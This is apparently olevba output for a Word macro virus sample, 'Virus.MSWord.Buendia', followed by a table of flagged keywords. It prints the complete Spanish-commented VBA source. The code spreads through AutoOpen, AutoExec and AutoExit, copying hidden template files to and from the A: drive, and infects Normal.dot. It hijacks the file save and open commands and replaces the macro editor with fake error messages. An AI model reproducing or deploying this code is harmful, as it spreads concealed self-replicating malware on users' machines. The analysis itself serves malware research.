olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Buendia-024a328994a4b69d661cf36af0bb5bd7924808f6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Buendia-024a328994a4b69d661cf36af0bb5bd7924808f6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Módulo21.bas 
in file: Virus.MSWord.Buendia-024a328994a4b69d661cf36af0bb5bd7924808f6 - OLE stream: 'Macros/VBA/Módulo21'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'               MACRO 21
'               ========
' Macro programada y diseñada por JLSH. Está
' dirigida a poder demostrar que no es tan dificil
' diseñar un virus que se esté por allí sin causar daño.
'
' La gracia que hace de mandar un mensaje el día
' 28 está dedicado a mi novia, con la que empecé
' a salir justamente en un día 28,además, fecha en que cumplo años.
'
' Este virus no tiene malas intenciones, solo
' intenta difundirse y alegrar un poco el mundo.
'
'                            JLSH
'                            ----
'
'

Sub AutoOpen()
On Error GoTo seguir
   FileCopy "a:\~wd28.tmp", Application.Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\~wd09.tmp"
   SetAttr Application.Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\~wd09.tmp", vbSystem + vbHidden
   FileCopy "a:\~wd28.tmp", Application.Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\~wd28.tmp"
   SetAttr Application.Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\~wd28.tmp", vbSystem + vbHidden
   Options.SaveNormalPrompt = False
   Copiar_Macros
seguir:

On Error GoTo continua
ActiveDocument.AttachedTemplate = "~wd09.tmp"
continua:

Application.ShowVisualBasicEditor = False

End Sub
Sub Copiar_Macros()
On Error Resume Next
    Application.OrganizerCopy Source:="A:\~wd09.tmp", Destination:= _
        NormalTemplate.FullName, Name:= _
        "Módulo21", object:=wdOrganizerObjectProjectItems
Exit Sub
End Sub
Sub ArchivoNuevo()
On Error Resume Next
Documents.Add Template:= _
        Application.Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\~wd09.tmp", _
        newtemplate:=False
End Sub
Sub ArchivoNuevoPredeter()
On Error Resume Next
    Documents.Add Template:= _
        Application.Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\~wd09.tmp", _
        newtemplate:=False
End Sub
Sub AutoNew()
On Error Resume Next
If Documents.Count = 0 Then
    Documents.Add Template:= _
        Application.Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\~wd09.tmp", _
        newtemplate:=False
End If
End Sub
Sub AutoExec()
On Error Resume Next
   FileCopy Application.Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\~wd28.tmp", "a:\~wd28.tmp"
If Err.Number <> 0 Then GoTo seguir
   SetAttr "a:\~wd28.tmp", vbSystem + vbHidden
   FileCopy Application.Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\~wd28.tmp", "a:\~wd09.tmp"
   SetAttr "a:\~wd09.tmp", vbSystem + vbHidden

seguir:
If Day(Date) = 28 Then
    MsgBox ("HOY ES UN BUEN DIA " + Application.UserName)
    Application.OnTime When:=Now + TimeValue("00:01:00"), Name:="Mensaje"

End If

If Application.Documents.Count = 0 Then
    Documents.Add Template:= _
        "C:\Archivos de programa\Microsoft Office\Plantillas\~wd09.tmp", _
        newtemplate:=False
End If

End Sub

Sub AutoExit()
On Error Resume Next
   FileCopy Application.Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\~wd28.tmp", "a:\~wd28.tmp"
If Err.Number <> 0 Then GoTo fin
   SetAttr "a:\~wd28.tmp", vbSystem + vbHidden
   FileCopy Application.Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\~wd28.tmp", "a:\~wd09.tmp"
   SetAttr "a:\~wd09.tmp", vbSystem + vbHidden
fin:
End Sub
Sub ViewVBcode()
    a = MsgBox("No pudo encontrar o iniciar Microsoft Visual Basic.", vbExclamation)
End Sub

Sub HerramMacro()
    a = MsgBox("No pudo encontrar o iniciar Visor de Macros.", vbExclamation)
End Sub
Sub mensaje()
    a = MsgBox("LUCY POR SIEMPRE TE RECORDARE atte: JAIRO ", vbExclamation)
End Sub
Sub FileOpen()
On Error Resume Next
    AutoExit
    Dialogs(wdDialogFileOpen).Show
End Sub
Sub FileSaveAs()
On Error Resume Next
    AutoExit
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileSave()
On Error Resume Next
    AutoExit
    Application.ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
